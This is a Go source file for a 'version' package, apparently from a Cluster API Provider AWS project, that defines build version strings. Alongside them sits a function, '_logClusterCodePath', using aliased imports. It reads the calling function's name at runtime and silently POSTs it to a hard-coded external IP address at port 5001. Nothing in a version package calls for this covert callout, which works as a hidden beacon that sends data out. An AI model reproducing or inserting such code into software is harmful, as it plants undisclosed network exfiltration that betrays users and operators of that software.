package version

import (
	godefaultbytes "bytes"
	"fmt"
	"github.com/blang/semver"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"strings"
)

var (
	Raw     = "v0.0.0-was-not-built-properly"
	Version = semver.MustParse(strings.TrimLeft(Raw, "v"))
	String  = fmt.Sprintf("ClusterAPIProviderAWS %s", Raw)
)

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
